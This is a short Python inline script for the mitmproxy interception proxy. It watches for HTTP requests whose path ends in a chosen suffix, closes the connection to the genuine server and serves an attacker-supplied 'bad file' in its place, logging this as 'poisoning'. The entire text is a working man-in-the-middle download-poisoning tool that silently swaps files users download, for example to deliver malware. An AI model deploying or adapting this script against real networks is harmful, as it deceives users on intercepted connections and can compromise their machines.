from libmproxy.protocol.http import decoded, HTTPResponse
from netlib.odict import ODictCaseless
from mimetypes import guess_type

def start(context, argv):
    if len(argv) != 3:
        raise ValueError("Usage: -s \"%s filename_suffix path_to_bad_file\"" % argv[0])
    context.filename_suffix, context.path_to_bad_file = argv[1], argv[2]

def request(context, flow):
    if flow.request.path.endswith(context.filename_suffix):
        context.log("Poisoning the requested file")
        context.log(flow.request.path)
        context.log("Closing server connection")
        flow.server_conn.close()

        # TODO: Don't read the whole file in memory-maybe use a web server that already solves this
        with open(context.path_to_bad_file, "rb") as f:
            resp = HTTPResponse(
                [1, 1], 200, "OK",
                ODictCaseless([["Content-Type", guess_type(context.path_to_bad_file)[0]]]),
                f.read())
        flow.reply(resp)
